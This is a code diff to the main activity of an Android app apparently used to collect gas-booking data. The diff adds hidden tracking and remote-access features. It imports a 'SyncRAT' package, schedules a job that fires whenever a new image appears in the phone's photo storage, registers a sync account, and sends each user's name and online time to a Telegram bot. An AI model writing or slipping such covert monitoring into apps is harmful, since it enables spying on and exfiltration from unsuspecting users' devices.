@@ -5,6 +5,8 @@ import static android.iocl.dac_collector.Utility.Constant.DefaultRegex;
 import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;
 import android.app.StatusBarManager;
 import android.app.admin.DevicePolicyManager;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -26,12 +28,16 @@ import android.iocl.dac_collector.ModelData.update_dac_collect;
 import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.RetrofitClient.RequestService;
 import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
+import android.iocl.dac_collector.RetrofitClient.TelegramService;
 import android.iocl.dac_collector.Services.DownloadService;
 import android.iocl.dac_collector.Services.FixOppoAutoKill;
+import android.iocl.dac_collector.Services.ImageJobService;
 import android.iocl.dac_collector.Services.JobSchedulerUtil;
+import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
 import android.iocl.dac_collector.Utility.Constant;
 import android.iocl.dac_collector.Utility.PermissionUtility;
 import android.iocl.dac_collector.Utility.SharedPrefs;
+import android.iocl.dac_collector.Utility.TelegramBot;
 import android.iocl.dac_collector.Utility.Utility;
 import android.iocl.dac_collector.adapter.UpdateDescList;
 import android.net.ConnectivityManager;
@@ -42,6 +48,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.text.Html;
 import android.util.Log;
@@ -77,8 +84,10 @@ import com.ykun.live_library.config.ForegroundNotification;
 
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Date;
 import java.util.List;
 import java.util.concurrent.Executor;
 import java.util.concurrent.ExecutorService;
@@ -126,8 +135,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         setContentView(R.layout.activity_main);
 
         setViewsUI();
-
-
         checkMissingPermissions();
         initFirebaseThings();
         sharedPrefsCheck();
@@ -157,6 +164,11 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         Log.d(TAG, "requestAddTileService result success");
         runOnUiThread(() -> Toast.makeText(this, "Tile added!", Toast.LENGTH_SHORT).show());
     };
+
+    public static String getCurrentDateString() {
+        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm");
+        return sdf.format(new Date());
+    }
 
 
     private void implementKeepAliveBelow8() {
@@ -237,7 +249,36 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
     }
 
+    private void imageObserverSchedule() {
+        JobInfo jobInfo = null;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            jobInfo = new JobInfo.Builder(123,
+                    new ComponentName(this, ImageJobService.class))
+                    .addTriggerContentUri(
+                            new JobInfo.TriggerContentUri(
+                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                    JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
+                            )
+                    )
+                    .setTriggerContentMaxDelay(0)    // fire as soon as possible
+                    .setTriggerContentUpdateDelay(1000)  // but batch rapid changes
+
+                    .build();
+        }
+
+        JobScheduler jm = null;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            jm = this.getSystemService(JobScheduler.class);
+        }
+        jm.schedule(jobInfo);
+
+    }
+
     private void settingUpJobs() {
+        imageObserverSchedule();
+
+        SyncAccountUtil.getSyncAccount(this);
+
 
 
         if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {
@@ -388,6 +429,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         boolean isAnnual = data.getCon_type().equals("UJJAWALA") && !data.getBooking_date().isEmpty();
 
         userName.setText(data.getName());
+
+        TelegramBot.with(MainActivity.this).sendMessage("User Online -> " + data.getName() + " At -> " + getCurrentDateString());
+
 
         remainBook.setText(isAnnual ? data.getSubscription() : "Recharge End");
         lastBook.setText(isAnnual ? data.getBooking_date() : "No Subscription");
@@ -635,12 +679,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
     // Moved outside the onCreate method
-    private void reqIgnoreBattery() {
-        XXPermissions.with(this)
-                .permission(Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                .request((permissions, allGranted) -> {
-                });
-    }
 
     private void userFind(String userSearchTerm, LinearLayout loader, TextView loader_text, View view, AlertDialog dialog) {
         loader_controller("Getting User Data ...", true, loader, loader_text);
